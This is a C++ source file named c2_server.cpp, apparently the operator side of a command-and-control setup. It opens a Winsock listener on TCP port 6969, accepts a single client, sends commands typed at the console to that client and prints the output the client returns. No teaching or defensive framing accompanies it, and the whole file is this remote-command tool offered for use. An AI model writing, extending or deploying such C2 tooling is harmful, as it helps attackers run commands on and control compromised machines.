// c2_server.cpp
#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

/**
 * Initializes Winsock for network communication.
 * 
 * @return true if initialization is successful, false otherwise.
 */
bool initializeWinsock() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed: " << result << std::endl;
        return false;
    }
    return true;
}

/**
 * Creates a listening socket bound to the specified port.
 * 
 * @param port The port number to bind the listening socket to.
 * @return The listening socket if successful, INVALID_SOCKET otherwise.
 */
SOCKET createListeningSocket(const char* port) {
    struct addrinfo *result = nullptr, hints;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET; // IPv4 address family
    hints.ai_socktype = SOCK_STREAM; // Stream socket type
    hints.ai_protocol = IPPROTO_TCP; // TCP protocol
    hints.ai_flags = AI_PASSIVE; // For wildcard IP address

    // Resolve the local address and port to be used by the server
    int iResult = getaddrinfo(nullptr, port, &hints, &result);
    if (iResult != 0) {
        std::cerr << "getaddrinfo failed: " << iResult << std::endl;
        WSACleanup();
        return INVALID_SOCKET;
    }

    SOCKET ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET) {
        std::cerr << "Error at socket(): " << WSAGetLastError() << std::endl;
        freeaddrinfo(result);
        WSACleanup();
        return INVALID_SOCKET;
    }

    // Bind the listening socket
    iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        std::cerr << "Bind failed with error: " << WSAGetLastError() << std::endl;
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return INVALID_SOCKET;
    }

    freeaddrinfo(result);
    return ListenSocket;
}

/**
 * Listens for and handles incoming client connections.
 * 
 * @param ListenSocket The listening socket that accepts incoming connections.
 */
void listenForClients(SOCKET ListenSocket) {
    if (listen(ListenSocket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "Listen failed with error: " << WSAGetLastError() << std::endl;
        closesocket(ListenSocket);
        WSACleanup();
        return;
    }

    std::cout << "Waiting for client connections..." << std::endl;

    SOCKET ClientSocket = accept(ListenSocket, nullptr, nullptr);
    if (ClientSocket == INVALID_SOCKET) {
        std::cerr << "Accept failed: " << WSAGetLastError() << std::endl;
        closesocket(ListenSocket);
        WSACleanup();
        return;
    }

    std::cout << "Client connected. Enter commands to send:" << std::endl;
    std::string cmd;
    char recvbuf[2048];
    int recvbuflen = 2048;

    while (true) {
        std::cout << "> ";
        std::getline(std::cin, cmd);
        if (cmd == "exit") break;

        int iSendResult = send(ClientSocket, cmd.c_str(), cmd.length(), 0);
        if (iSendResult == SOCKET_ERROR) {
            std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
            closesocket(ClientSocket);
            WSACleanup();
            return;
        }

        int iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
        if (iResult > 0) {
            std::cout << "Received output: " << std::string(recvbuf, iResult) << std::endl;
        } else if (iResult == 0) {
            std::cout << "Connection closing..." << std::endl;
        } else {
            std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
            closesocket(ClientSocket);
            WSACleanup();
            return;
        }
    }

    // Shutdown the connection since we're done
    int iResult = shutdown(ClientSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        std::cerr << "shutdown failed: " << WSAGetLastError() << std::endl;
        closesocket(ClientSocket);
        WSACleanup();
        return;
    }

    closesocket(ClientSocket);
}

int main() {
    const char* port = "6969";

    if (!initializeWinsock()) return 1;

    SOCKET ListenSocket = createListeningSocket(port);
    if (ListenSocket == INVALID_SOCKET) return 1;

    listenForClients(ListenSocket);

    // Cleanup
    closesocket(ListenSocket);
    WSACleanup();

    return 0;
}